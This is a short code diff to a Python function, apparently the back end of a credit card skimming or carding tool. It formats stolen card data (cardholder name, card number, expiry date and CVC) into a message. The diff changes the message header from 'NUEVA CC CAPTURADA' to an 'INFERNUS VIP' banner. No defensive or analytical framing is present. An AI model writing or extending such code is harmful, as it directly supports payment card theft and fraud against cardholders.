@@ -39,9 +39,7 @@ def recibir_datos():
     cvc = data.get('cvc', 'N/A')
 
     mensaje = (
-        f"💰 *NUEVA CC CAPTURADA* 💰\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"🌐 *Origen:* `{origen}`\n"
+         f"━━━━━━━INFERNUS VIP━━━━━━━━━━━\n"
         f"👤 *Nombre:* `{nombre}`\n"
         f"💳 *Tarjeta:* `{tarjeta}`\n"
         f"📅 *Exp:* `{expiracion}`\n"
